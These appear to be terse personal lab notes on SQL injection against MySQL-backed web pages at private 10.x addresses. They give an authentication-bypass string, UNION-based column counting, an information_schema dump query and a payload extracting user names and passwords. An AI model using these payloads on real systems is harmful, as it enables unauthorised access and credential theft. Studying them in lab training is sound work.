```mysql
database -> tables -> columns -> rows

mysql
information_schema
performance_schema

select 1,2,3 from database.table

select table_schema,table_name,column_name from information_schema.columns

SELECT id FROM users WHERE name='tom' or 1='1' AND pass='tom' or 1='1';

http://10.208.50.61/


username and password fields
interact with site normally
tom' or 1='1  ( post method )
tom' or 1='1 ( get method ) f12 ( dev console ) change to get on inspect tab


Blind injection

test for vuln
php?item=1 or 1=1


Test number of columns
php?item=1 union select 1,2,3,4

Golden Statement
php?item=1 union select table_schema,table_name,column_name,4 from information_schema.columns

http://10.208.50.61/Union.html
4 columns
Audi' union select table_schema,2,table_name,column_name,5 from information_schema.columns#


Audi' union select id,2,name,pass,5 from session.user#

http://10.208.50.61/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns

```

